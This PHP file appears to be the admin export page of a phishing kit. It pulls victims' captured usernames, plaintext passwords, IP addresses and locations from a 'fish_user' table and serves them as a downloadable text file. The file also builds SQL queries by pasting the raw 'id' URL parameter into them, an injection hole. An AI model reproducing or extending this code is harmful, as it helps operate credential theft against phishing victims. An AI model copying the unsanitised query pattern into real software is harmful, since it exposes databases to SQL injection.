<?php
require_once '../include/common.php';
if ($islogin == 1) {
} else exit("<script language='javascript'>window.location.href='./login.php';</script>");
if (isset($_GET['all'])) {
    $sql = "select * from fish_user;";
    $update = "update fish_user set output=1;";
} else {
    $zhi = $_GET['id'];
    if ($zhi == '') {
        exit('id error！');
    }
    $sql = "select * from fish_user where id in($zhi);";
    $update = "update fish_user set output=1 where id in($zhi);";
}
$filename = date("Y-m-d") . '-Data.txt';//
header('Content-Type: text/x-sql');
header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');
header('Content-Disposition: attachment; filename="' . $filename . '"');
$is_ie = 'IE';
if ($is_ie == 'IE') {
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
} else {
    header('Pragma: no-cache');
    header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
}
$data = $DB->query($sql);
$DB->query($update);
$date = date("Y-m-d H:i:s");
echo $date . " Exported data\r\n";
while ($row = $DB->fetch($data)) {
    echo $row['username'] . "----" . $row['password'] . "----" . $row['ip'] . "----" . $row['address'] . "----" . $row['time'];
    echo "\r\n";
}
exit();
?>